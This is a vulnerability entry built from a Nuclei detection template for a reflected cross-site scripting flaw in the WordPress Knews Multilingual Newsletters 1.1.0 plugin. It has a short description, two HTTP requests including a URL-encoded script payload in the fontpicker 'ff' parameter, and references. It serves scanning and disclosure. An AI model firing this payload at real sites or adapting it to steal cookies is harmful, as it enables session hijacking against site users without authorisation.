# Nuclei Template: WordPress Knews Multilingual Newsletters 1.1.0 - Cross-Site Scripting
**Template ID:** wp-knews-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-knews-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Knews Multilingual Newsletters 1.1.0 plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/knews/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/knews/wysiwyg/fontpicker/?ff=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- http://web.archive.org/web/20210213220043/https://www.securityfocus.com/bid/54330/info
- https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-knews-multilingual-newsletters-ff-parameter-cross-site-scripting-1-1-0
